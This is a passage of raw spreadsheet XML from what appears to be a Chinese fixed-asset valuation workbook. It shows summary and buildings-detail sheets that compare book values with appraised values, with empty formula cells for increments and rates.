        <f>IF(N23=0,"",P23/N23*100)</f>
        <v/>
      </c>
      <c r="R23" s="555" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="380" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="381" t="n"/>
      <c r="F24" s="381" t="n"/>
      <c r="G24" s="578" t="n"/>
      <c r="H24" s="380" t="n"/>
      <c r="I24" s="380" t="n"/>
      <c r="J24" s="380" t="n"/>
      <c r="K24" s="380" t="n"/>
      <c r="L24" s="555" t="n"/>
      <c r="M24" s="555" t="n"/>
      <c r="N24" s="555" t="n"/>
      <c r="O24" s="555" t="n"/>
      <c r="P24" s="555">
        <f>O24-N24</f>
        <v/>
      </c>
      <c r="Q24" s="555">
        <f>IF(N24=0,"",P24/N24*100)</f>
        <v/>
      </c>
      <c r="R24" s="555" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="380" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="381" t="n"/>
      <c r="F25" s="381" t="n"/>
      <c r="G25" s="578" t="n"/>
      <c r="H25" s="380" t="n"/>
      <c r="I25" s="380" t="n"/>
      <c r="J25" s="380" t="n"/>
      <c r="K25" s="380" t="n"/>
      <c r="L25" s="555" t="n"/>
      <c r="M25" s="555" t="n"/>
      <c r="N25" s="555" t="n"/>
      <c r="O25" s="555" t="n"/>
      <c r="P25" s="555">
        <f>O25-N25</f>
        <v/>
      </c>
      <c r="Q25" s="555">
        <f>IF(N25=0,"",P25/N25*100)</f>
        <v/>
      </c>
      <c r="R25" s="555" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="380" t="n"/>
      <c r="D26" s="381" t="n"/>
      <c r="E26" s="381" t="n"/>
      <c r="F26" s="381" t="n"/>
      <c r="G26" s="578" t="n"/>
      <c r="H26" s="380" t="n"/>
      <c r="I26" s="380" t="n"/>
      <c r="J26" s="380" t="n"/>
      <c r="K26" s="380" t="n"/>
      <c r="L26" s="555" t="n"/>
      <c r="M26" s="555" t="n"/>
      <c r="N26" s="555" t="n"/>
      <c r="O26" s="555" t="n"/>
      <c r="P26" s="555">
        <f>O26-N26</f>
        <v/>
      </c>
      <c r="Q26" s="555">
        <f>IF(N26=0,"",P26/N26*100)</f>
        <v/>
      </c>
      <c r="R26" s="555" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C27" s="593" t="n"/>
      <c r="D27" s="567" t="n"/>
      <c r="E27" s="381" t="n"/>
      <c r="F27" s="381" t="n"/>
      <c r="G27" s="115" t="n"/>
      <c r="H27" s="380" t="n"/>
      <c r="I27" s="380" t="n"/>
      <c r="J27" s="380" t="n"/>
      <c r="K27" s="380" t="n"/>
      <c r="L27" s="555">
        <f>SUM(L7:L26)</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>SUM(M7:M26)</f>
        <v/>
      </c>
      <c r="N27" s="555">
        <f>SUM(N7:N26)</f>
        <v/>
      </c>
      <c r="O27" s="555">
        <f>SUM(O7:O26)</f>
        <v/>
      </c>
      <c r="P27" s="555">
        <f>O27-N27</f>
        <v/>
      </c>
      <c r="Q27" s="555">
        <f>IF(N27=0,"",P27/N27*100)</f>
        <v/>
      </c>
      <c r="R27" s="555" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>减：投资性房地产减值准备</t>
        </is>
      </c>
      <c r="C28" s="593" t="n"/>
      <c r="D28" s="567" t="n"/>
      <c r="E28" s="381" t="n"/>
      <c r="F28" s="381" t="n"/>
      <c r="G28" s="115" t="n"/>
      <c r="H28" s="380" t="n"/>
      <c r="I28" s="380" t="n"/>
      <c r="J28" s="380" t="n"/>
      <c r="K28" s="380" t="n"/>
      <c r="L28" s="555" t="n"/>
      <c r="M28" s="555" t="n"/>
      <c r="N28" s="555" t="n"/>
      <c r="O28" s="555" t="n"/>
      <c r="P28" s="555">
        <f>O28-N28</f>
        <v/>
      </c>
      <c r="Q28" s="555">
        <f>IF(N28=0,"",P28/N28*100)</f>
        <v/>
      </c>
      <c r="R28" s="555" t="n"/>
    </row>
    <row r="29" ht="17.25" customHeight="1" s="415">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C29" s="593" t="n"/>
      <c r="D29" s="567" t="n"/>
      <c r="E29" s="381" t="n"/>
      <c r="F29" s="381" t="n"/>
      <c r="G29" s="115" t="n"/>
      <c r="H29" s="380" t="n"/>
      <c r="I29" s="380" t="n"/>
      <c r="J29" s="380" t="n"/>
      <c r="K29" s="380" t="n"/>
      <c r="L29" s="555">
        <f>L27-L28</f>
        <v/>
      </c>
      <c r="M29" s="555">
        <f>M27-M28</f>
        <v/>
      </c>
      <c r="N29" s="555">
        <f>N27-N28</f>
        <v/>
      </c>
      <c r="O29" s="555">
        <f>O27-O28</f>
        <v/>
      </c>
      <c r="P29" s="555">
        <f>O29-N29</f>
        <v/>
      </c>
      <c r="Q29" s="555">
        <f>IF(N29=0,"",P29/N29*100)</f>
        <v/>
      </c>
      <c r="R29" s="555" t="n"/>
    </row>
    <row r="30" ht="16.8" customHeight="1" s="415">
      <c r="A30" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="7">
    <mergeCell ref="B28:D28"/>
    <mergeCell ref="B5:F5"/>
    <mergeCell ref="B2:R2"/>
    <mergeCell ref="B27:D27"/>
    <mergeCell ref="B3:R3"/>
    <mergeCell ref="B29:D29"/>
    <mergeCell ref="B1:R1"/>
  </mergeCells>
  <conditionalFormatting sqref="B6:R29">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(B6)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0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 codeName="Sheet55">
    <tabColor rgb="FF92D050"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:L21"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" topLeftCell="A2" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="E20" sqref="E20"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="7" customWidth="1" style="410" min="2" max="2"/>
    <col hidden="1" width="7" customWidth="1" style="410" min="3" max="3"/>
    <col width="25.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="13.1666666666667" customWidth="1" style="410" min="5" max="10"/>
    <col width="9.16666666666667" customWidth="1" style="410" min="11" max="12"/>
    <col width="9" customWidth="1" style="410" min="13" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>固定资产评估汇总表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="18" customHeight="1" s="415">
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="18" customHeight="1" s="415">
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="373" t="n"/>
      <c r="H3" s="373" t="n"/>
      <c r="I3" s="373" t="n"/>
      <c r="J3" s="402" t="inlineStr">
        <is>
          <t>表4-8</t>
        </is>
      </c>
    </row>
    <row r="4" ht="18" customHeight="1" s="415">
      <c r="B4" s="549">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C4" s="549" t="n"/>
      <c r="D4" s="376" t="n"/>
      <c r="E4" s="376" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="376" t="n"/>
      <c r="I4" s="253" t="n"/>
      <c r="J4" s="253" t="n"/>
      <c r="K4" s="253" t="n"/>
      <c r="L4" s="176">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="18" customFormat="1" customHeight="1" s="204">
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="C5" s="185" t="inlineStr">
        <is>
          <t>项目编号</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>科目名称</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="567" t="n"/>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="H5" s="567" t="n"/>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="J5" s="567" t="n"/>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="L5" s="567" t="n"/>
    </row>
    <row r="6" ht="18" customFormat="1" customHeight="1" s="204">
      <c r="B6" s="594" t="n"/>
      <c r="C6" s="594" t="n"/>
      <c r="D6" s="594" t="n"/>
      <c r="E6" s="380" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="F6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="G6" s="380" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="H6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="I6" s="380" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="J6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="K6" s="380" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="L6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
    </row>
    <row r="7" ht="18" customHeight="1" s="415">
      <c r="B7" s="284" t="inlineStr">
        <is>
          <t>4-8-1</t>
        </is>
      </c>
      <c r="C7" s="182" t="inlineStr">
        <is>
          <t>固资房屋</t>
        </is>
      </c>
      <c r="D7" s="254" t="inlineStr">
        <is>
          <t>固定资产-房屋建筑物</t>
        </is>
      </c>
      <c r="E7" s="555">
        <f>'4-8-1房屋建筑物'!J34</f>
        <v/>
      </c>
      <c r="F7" s="555">
        <f>'4-8-1房屋建筑物'!K34</f>
        <v/>
      </c>
      <c r="G7" s="555">
        <f>'4-8-1房屋建筑物'!L34</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>'4-8-1房屋建筑物'!N34</f>
        <v/>
      </c>
      <c r="I7" s="555">
        <f>G7-E7</f>
        <v/>
      </c>
      <c r="J7" s="555">
        <f>H7-F7</f>
        <v/>
      </c>
      <c r="K7" s="555">
        <f>IF(E7=0,"",ROUND(I7/E7*100,2))</f>
        <v/>
      </c>
      <c r="L7" s="555">
        <f>IF(F7=0,"",ROUND(J7/F7*100,2))</f>
        <v/>
      </c>
    </row>
    <row r="8" ht="18" customHeight="1" s="415">
      <c r="B8" s="284" t="inlineStr">
        <is>
          <t>4-8-2</t>
        </is>
      </c>
      <c r="C8" s="182" t="inlineStr">
        <is>
          <t>固资构筑</t>
        </is>
      </c>
      <c r="D8" s="254" t="inlineStr">
        <is>
          <t>固定资产-构筑物及其他辅助设施</t>
        </is>
      </c>
      <c r="E8" s="555">
        <f>'4-8-2构筑物'!J34</f>
        <v/>
      </c>
      <c r="F8" s="555">
        <f>'4-8-2构筑物'!K34</f>
        <v/>
      </c>
      <c r="G8" s="555">
        <f>'4-8-2构筑物'!L34</f>
        <v/>
      </c>
      <c r="H8" s="555">
        <f>'4-8-2构筑物'!N34</f>
        <v/>
      </c>
      <c r="I8" s="555">
        <f>G8-E8</f>
        <v/>
      </c>
      <c r="J8" s="555">
        <f>H8-F8</f>
        <v/>
      </c>
      <c r="K8" s="555">
        <f>IF(E8=0,"",ROUND(I8/E8*100,2))</f>
        <v/>
      </c>
      <c r="L8" s="555">
        <f>IF(F8=0,"",ROUND(J8/F8*100,2))</f>
        <v/>
      </c>
    </row>
    <row r="9" ht="18" customHeight="1" s="415">
      <c r="B9" s="284" t="inlineStr">
        <is>
          <t>4-8-3</t>
        </is>
      </c>
      <c r="C9" s="182" t="inlineStr">
        <is>
          <t>固资管道</t>
        </is>
      </c>
      <c r="D9" s="254" t="inlineStr">
        <is>
          <t>固定资产-管道及沟槽</t>
        </is>
      </c>
      <c r="E9" s="555">
        <f>'4-8-3管道沟槽'!J34</f>
        <v/>
      </c>
      <c r="F9" s="555">
        <f>'4-8-3管道沟槽'!K34</f>
        <v/>
      </c>
      <c r="G9" s="555">
        <f>'4-8-3管道沟槽'!L34</f>
        <v/>
      </c>
      <c r="H9" s="555">
        <f>'4-8-3管道沟槽'!N34</f>
        <v/>
      </c>
      <c r="I9" s="555">
        <f>G9-E9</f>
        <v/>
      </c>
      <c r="J9" s="555">
        <f>H9-F9</f>
        <v/>
      </c>
      <c r="K9" s="555">
        <f>IF(E9=0,"",ROUND(I9/E9*100,2))</f>
        <v/>
      </c>
      <c r="L9" s="555">
        <f>IF(F9=0,"",ROUND(J9/F9*100,2))</f>
        <v/>
      </c>
    </row>
    <row r="10" ht="18" customHeight="1" s="415">
      <c r="B10" s="284" t="n"/>
      <c r="C10" s="255" t="inlineStr">
        <is>
          <t>固房汇总</t>
        </is>
      </c>
      <c r="D10" s="395" t="inlineStr">
        <is>
          <t>房屋建筑物类合计</t>
        </is>
      </c>
      <c r="E10" s="555">
        <f>SUBTOTAL(9,E7:E9)</f>
        <v/>
      </c>
      <c r="F10" s="555">
        <f>SUBTOTAL(9,F7:F9)</f>
        <v/>
      </c>
      <c r="G10" s="555">
        <f>SUBTOTAL(9,G7:G9)</f>
        <v/>
      </c>
      <c r="H10" s="555">
        <f>SUBTOTAL(9,H7:H9)</f>
        <v/>
      </c>
      <c r="I10" s="555">
        <f>G10-E10</f>
        <v/>
      </c>
      <c r="J10" s="555">
        <f>H10-F10</f>
        <v/>
      </c>
      <c r="K10" s="555">
        <f>IF(E10=0,"",ROUND(I10/E10*100,2))</f>
        <v/>
      </c>
      <c r="L10" s="555">
        <f>IF(F10=0,"",ROUND(J10/F10*100,2))</f>
        <v/>
      </c>
    </row>
    <row r="11" ht="18" customHeight="1" s="415">
      <c r="B11" s="284" t="n"/>
      <c r="C11" s="182" t="n"/>
      <c r="D11" s="327" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555" t="n"/>
    </row>
    <row r="12" ht="18" customHeight="1" s="415">
      <c r="B12" s="284" t="n"/>
      <c r="C12" s="182" t="n"/>
      <c r="D12" s="254" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555" t="n"/>
    </row>
    <row r="13" ht="18" customHeight="1" s="415">
      <c r="B13" s="284" t="inlineStr">
        <is>
          <t>4-8-4</t>
        </is>
      </c>
      <c r="C13" s="255" t="inlineStr">
        <is>
          <t>固资机器</t>
        </is>
      </c>
      <c r="D13" s="254" t="inlineStr">
        <is>
          <t>固定资产-机器设备</t>
        </is>
      </c>
      <c r="E13" s="555">
        <f>'4-8-4机器设备'!K34</f>
        <v/>
      </c>
      <c r="F13" s="555">
        <f>'4-8-4机器设备'!L34</f>
        <v/>
      </c>
      <c r="G13" s="555">
        <f>'4-8-4机器设备'!M34</f>
        <v/>
      </c>
      <c r="H13" s="555">
        <f>'4-8-4机器设备'!O34</f>
        <v/>
      </c>
      <c r="I13" s="555">
        <f>G13-E13</f>
        <v/>
      </c>
      <c r="J13" s="555">
        <f>H13-F13</f>
        <v/>
      </c>
      <c r="K13" s="555">
        <f>IF(E13=0,"",ROUND(I13/E13*100,2))</f>
        <v/>
      </c>
      <c r="L13" s="555">
        <f>IF(F13=0,"",ROUND(J13/F13*100,2))</f>
        <v/>
      </c>
    </row>
    <row r="14" ht="18" customHeight="1" s="415">
      <c r="B14" s="284" t="inlineStr">
        <is>
          <t>4-8-5</t>
        </is>
      </c>
      <c r="C14" s="182" t="inlineStr">
        <is>
          <t>固资运输</t>
        </is>
      </c>
      <c r="D14" s="254" t="inlineStr">
        <is>
          <t>固定资产-车辆</t>
        </is>
      </c>
      <c r="E14" s="555">
        <f>'4-8-5车辆'!K34</f>
        <v/>
      </c>
      <c r="F14" s="555">
        <f>'4-8-5车辆'!L34</f>
        <v/>
      </c>
      <c r="G14" s="555">
        <f>'4-8-5车辆'!M34</f>
        <v/>
      </c>
      <c r="H14" s="555">
        <f>'4-8-5车辆'!O34</f>
        <v/>
      </c>
      <c r="I14" s="555">
        <f>G14-E14</f>
        <v/>
      </c>
      <c r="J14" s="555">
        <f>H14-F14</f>
        <v/>
      </c>
      <c r="K14" s="555">
        <f>IF(E14=0,"",ROUND(I14/E14*100,2))</f>
        <v/>
      </c>
      <c r="L14" s="555">
        <f>IF(F14=0,"",ROUND(J14/F14*100,2))</f>
        <v/>
      </c>
    </row>
    <row r="15" ht="18" customHeight="1" s="415">
      <c r="B15" s="284" t="inlineStr">
        <is>
          <t>4-8-6</t>
        </is>
      </c>
      <c r="C15" s="182" t="inlineStr">
        <is>
          <t>固资电子</t>
        </is>
      </c>
      <c r="D15" s="254" t="inlineStr">
        <is>
          <t>固定资产-电子设备</t>
        </is>
      </c>
      <c r="E15" s="555">
        <f>'4-8-6电子设备'!K34</f>
        <v/>
      </c>
      <c r="F15" s="555">
        <f>'4-8-6电子设备'!L34</f>
        <v/>
      </c>
      <c r="G15" s="555">
        <f>'4-8-6电子设备'!M34</f>
        <v/>
      </c>
      <c r="H15" s="555">
        <f>'4-8-6电子设备'!O34</f>
        <v/>
      </c>
      <c r="I15" s="555">
        <f>G15-E15</f>
        <v/>
      </c>
      <c r="J15" s="555">
        <f>H15-F15</f>
        <v/>
      </c>
      <c r="K15" s="555">
        <f>IF(E15=0,"",ROUND(I15/E15*100,2))</f>
        <v/>
      </c>
      <c r="L15" s="555">
        <f>IF(F15=0,"",ROUND(J15/F15*100,2))</f>
        <v/>
      </c>
    </row>
    <row r="16" ht="18" customHeight="1" s="415">
      <c r="B16" s="284" t="n"/>
      <c r="C16" s="255" t="inlineStr">
        <is>
          <t>固设汇总</t>
        </is>
      </c>
      <c r="D16" s="395" t="inlineStr">
        <is>
          <t>设备类合计</t>
        </is>
      </c>
      <c r="E16" s="555">
        <f>SUBTOTAL(9,E13:E15)</f>
        <v/>
      </c>
      <c r="F16" s="555">
        <f>SUBTOTAL(9,F13:F15)</f>
        <v/>
      </c>
      <c r="G16" s="555">
        <f>SUBTOTAL(9,G13:G15)</f>
        <v/>
      </c>
      <c r="H16" s="555">
        <f>SUBTOTAL(9,H13:H15)</f>
        <v/>
      </c>
      <c r="I16" s="555">
        <f>G16-E16</f>
        <v/>
      </c>
      <c r="J16" s="555">
        <f>H16-F16</f>
        <v/>
      </c>
      <c r="K16" s="555">
        <f>IF(E16=0,"",ROUND(I16/E16*100,2))</f>
        <v/>
      </c>
      <c r="L16" s="555">
        <f>IF(F16=0,"",ROUND(J16/F16*100,2))</f>
        <v/>
      </c>
    </row>
    <row r="17" ht="18" customHeight="1" s="415">
      <c r="B17" s="284" t="n"/>
      <c r="C17" s="182" t="n"/>
      <c r="D17" s="254" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555" t="n"/>
    </row>
    <row r="18" ht="18" customHeight="1" s="415">
      <c r="B18" s="284" t="inlineStr">
        <is>
          <t>4-8-7</t>
        </is>
      </c>
      <c r="C18" s="255" t="inlineStr">
        <is>
          <t>固资清理</t>
        </is>
      </c>
      <c r="D18" s="258" t="inlineStr">
        <is>
          <t>固定资产清理</t>
        </is>
      </c>
      <c r="E18" s="555">
        <f>'4-8-7固定资产清理'!E29</f>
        <v/>
      </c>
      <c r="F18" s="555">
        <f>'4-8-7固定资产清理'!F29</f>
        <v/>
      </c>
      <c r="G18" s="555">
        <f>'4-8-7固定资产清理'!G29</f>
        <v/>
      </c>
      <c r="H18" s="555">
        <f>'4-8-7固定资产清理'!I29</f>
        <v/>
      </c>
      <c r="I18" s="555">
        <f>G18-E18</f>
        <v/>
      </c>
      <c r="J18" s="555">
        <f>H18-F18</f>
        <v/>
      </c>
      <c r="K18" s="555">
        <f>IF(E18=0,"",ROUND(I18/E18*100,2))</f>
        <v/>
      </c>
      <c r="L18" s="555">
        <f>IF(F18=0,"",ROUND(J18/F18*100,2))</f>
        <v/>
      </c>
    </row>
    <row r="19" ht="18" customHeight="1" s="415">
      <c r="B19" s="284" t="n"/>
      <c r="C19" s="397" t="n"/>
      <c r="D19" s="254" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555" t="n"/>
    </row>
    <row r="20" ht="18" customHeight="1" s="415">
      <c r="A20" s="148" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B20" s="200" t="n"/>
      <c r="C20" s="201" t="inlineStr">
        <is>
          <t>固资汇总</t>
        </is>
      </c>
      <c r="D20" s="259" t="inlineStr">
        <is>
          <t>固定资产合计</t>
        </is>
      </c>
      <c r="E20" s="555">
        <f>SUBTOTAL(9,E7:E19)</f>
        <v/>
      </c>
      <c r="F20" s="555">
        <f>SUBTOTAL(9,F7:F19)</f>
        <v/>
      </c>
      <c r="G20" s="555">
        <f>SUBTOTAL(9,G7:G19)</f>
        <v/>
      </c>
      <c r="H20" s="555">
        <f>SUBTOTAL(9,H7:H19)</f>
        <v/>
      </c>
      <c r="I20" s="555">
        <f>G20-E20</f>
        <v/>
      </c>
      <c r="J20" s="555">
        <f>H20-F20</f>
        <v/>
      </c>
      <c r="K20" s="555">
        <f>IF(E20=0,"",ROUND(I20/E20*100,2))</f>
        <v/>
      </c>
      <c r="L20" s="555">
        <f>IF(F20=0,"",ROUND(J20/F20*100,2))</f>
        <v/>
      </c>
    </row>
    <row r="21" ht="18" customHeight="1" s="415">
      <c r="B21" s="344" t="n"/>
      <c r="C21" s="344" t="n"/>
      <c r="D21" s="347" t="n"/>
      <c r="E21" s="347" t="n"/>
      <c r="F21" s="347" t="n"/>
      <c r="G21" s="347" t="n"/>
      <c r="H21" s="347" t="n"/>
      <c r="I21" s="347" t="n"/>
      <c r="J21" s="347" t="n"/>
      <c r="K21" s="347" t="n"/>
      <c r="L21" s="291" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="10">
    <mergeCell ref="B2:L2"/>
    <mergeCell ref="E5:F5"/>
    <mergeCell ref="K5:L5"/>
    <mergeCell ref="I5:J5"/>
    <mergeCell ref="G5:H5"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="J3:L3"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="B1:L1"/>
    <mergeCell ref="D5:D6"/>
  </mergeCells>
  <conditionalFormatting sqref="E7:L20">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(E7)</formula>
    </cfRule>
  </conditionalFormatting>
  <printOptions horizontalCentered="1"/>
  <pageMargins left="0.590551181102362" right="0.590551181102362" top="0.866141732283464" bottom="0.972222222222222" header="0.47244094488189" footer="0.597222222222222"/>
  <pageSetup orientation="landscape" paperSize="9" scale="97" fitToHeight="0" blackAndWhite="1"/>
</worksheet>
</file>

<file path=xl/worksheets/sheet59.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet56">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:T34"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScale="85" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="G34" sqref="G34"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="10.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="13.1666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="6.83333333333333" customWidth="1" style="410" min="5" max="5"/>
    <col width="9.66666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="5.66666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col width="10" customWidth="1" style="410" min="8" max="8"/>
    <col width="9.16666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="10" max="11"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="12" max="12"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="14" max="16"/>
    <col outlineLevel="1" width="7.33333333333333" customWidth="1" style="410" min="17" max="17"/>
    <col outlineLevel="1" width="11.8333333333333" customWidth="1" style="410" min="18" max="18"/>
    <col width="7.5" customWidth="1" style="410" min="19" max="19"/>
    <col width="9" customWidth="1" style="410" min="2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固定资产—房屋建筑物评估明细表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7" t="n"/>
      <c r="L3" s="547" t="n"/>
      <c r="M3" s="547" t="n"/>
      <c r="N3" s="547" t="n"/>
      <c r="O3" s="547" t="n"/>
      <c r="P3" s="547" t="n"/>
      <c r="Q3" s="603" t="n"/>
      <c r="R3" s="604" t="inlineStr">
        <is>
          <t>表4-8-1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376" t="n"/>
      <c r="P4" s="376" t="n"/>
      <c r="S4" s="217">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
      <c r="T4" s="148" t="inlineStr">
        <is>
          <t>辅助栏</t>
        </is>
      </c>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="204">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头1</t>
        </is>
      </c>
      <c r="B5" s="271" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="271" t="inlineStr">
        <is>
          <t>权证编号</t>
        </is>
      </c>
      <c r="D5" s="271" t="inlineStr">
        <is>
          <t>建筑物名称</t>
        </is>
      </c>
      <c r="E5" s="271" t="inlineStr">
        <is>
          <t>结构</t>
        </is>
      </c>
      <c r="F5" s="271" t="inlineStr">
        <is>
          <t>建成
年月</t>
        </is>
      </c>
      <c r="G5" s="605" t="inlineStr">
        <is>
          <t>计量单位</t>
        </is>
      </c>
      <c r="H5" s="271" t="inlineStr">
        <is>
          <t>建筑面积
(m2)</t>
        </is>
      </c>
      <c r="I5" s="271" t="inlineStr">
        <is>
          <t>成本单价
(元/m2)</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="K5" s="567" t="n"/>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="M5" s="593" t="n"/>
      <c r="N5" s="567" t="n"/>
      <c r="O5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="P5" s="567" t="n"/>
      <c r="Q5" s="185" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="R5" s="264" t="inlineStr">
        <is>
          <t>评估原值单价
(元/m2)</t>
        </is>
      </c>
      <c r="S5" s="264" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
      <c r="T5" s="248" t="inlineStr">
        <is>
          <t>计提减值准备</t>
        </is>
      </c>
    </row>
    <row r="6" ht="21.7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307" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="K6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="L6" s="380" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="M6" s="380" t="inlineStr">
        <is>
          <t>成新率%</t>
        </is>
      </c>
      <c r="N6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="O6" s="306" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="P6" s="306" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="Q6" s="594" t="n"/>
